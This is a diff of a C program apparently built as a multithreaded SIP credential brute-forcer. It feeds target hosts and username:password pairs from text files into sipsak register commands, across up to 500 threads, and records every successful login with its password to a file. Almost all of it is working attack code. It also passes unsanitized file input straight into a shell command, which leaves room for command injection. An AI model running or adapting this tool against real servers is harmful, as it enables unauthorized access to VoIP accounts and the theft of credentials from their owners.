@@ -4,47 +4,60 @@
 #include <pthread.h>
 
 #define MAX_LINE 512
-#define MAX_CREDENTIALS 2  // Number of username:password pairs to be processed at once
 #define MAX_THREADS 500  // Number of targets to be processed simultaneously
 #define COMMAND_SIZE 2048  // Increase the size of the command buffer
+#define MAX_CREDENTIALS 2  // Number of username:password pairs to try at once
 
 typedef struct {
     char target[MAX_LINE];
-    char credentials[MAX_CREDENTIALS][MAX_LINE];
 } ThreadData;
 
 void *try_login(void *arg) {
     ThreadData *data = (ThreadData *)arg;
     char command[COMMAND_SIZE];
+    FILE *credentials = fopen("credentials.txt", "r");
+    char credential_line[MAX_LINE];
+    char output[COMMAND_SIZE];
 
-    for (int i = 0; i < MAX_CREDENTIALS; i++) {
-        char *username = strtok(data->credentials[i], ":");
+    if (!credentials) {
+        perror("Failed to open credentials file");
+        free(data);
+        return NULL;
+    }
+
+    int count = 0;
+    while (fgets(credential_line, sizeof(credential_line), credentials) && count < MAX_CREDENTIALS) {
+        strtok(credential_line, "\n");  // Remove newline
+
+        char *username = strtok(credential_line, ":");
         char *password = strtok(NULL, ":");
 
         snprintf(command, sizeof(command), "sipsak -U -C sip:%s@home.com --from sip:%s@%s -u %s -a %s -p %s -s sip:%s@%s -i -vvv -E udp",
                  username, username, data->target, username, password, data->target, username, data->target);
 
-        system(command);
+        FILE *cmd_output = popen(command, "r");
+        while (fgets(output, sizeof(output), cmd_output)) {
+            if (strstr(output, "200 OK") || strstr(output, "202 Accepted")) {
+                FILE *success_log = fopen("successful_logins.txt", "a");
+                fprintf(success_log, "Target: %s, Username: %s, Password: %s\n", data->target, username, password);
+                fclose(success_log);
+            }
+        }
+        pclose(cmd_output);
+        count++;
     }
 
+    fclose(credentials);
     free(data);
     return NULL;
 }
 
 int main() {
     FILE *targets = fopen("targets.txt", "r");
-    FILE *credentials = fopen("credentials.txt", "r");
     char target_line[MAX_LINE];
-    char credential_line[MAX_LINE];
 
     if (!targets) {
         perror("Failed to open targets file");
-        return 1;
-    }
-
-    if (!credentials) {
-        perror("Failed to open credentials file");
-        fclose(targets);
         return 1;
     }
 
@@ -56,15 +69,6 @@ int main() {
 
         ThreadData *data = malloc(sizeof(ThreadData));
         strncpy(data->target, target_line, sizeof(data->target) - 1);
-
-        for (int i = 0; i < MAX_CREDENTIALS; i++) {
-            if (fgets(credential_line, sizeof(credential_line), credentials)) {
-                strtok(credential_line, "\n");  // Remove newline
-                strncpy(data->credentials[i], credential_line, sizeof(data->credentials[i]) - 1);
-            } else {
-                break;
-            }
-        }
 
         pthread_create(&threads[current_thread], NULL, try_login, data);
         current_thread++;
@@ -83,6 +87,5 @@ int main() {
     }
 
     fclose(targets);
-    fclose(credentials);
     return 0;
 }
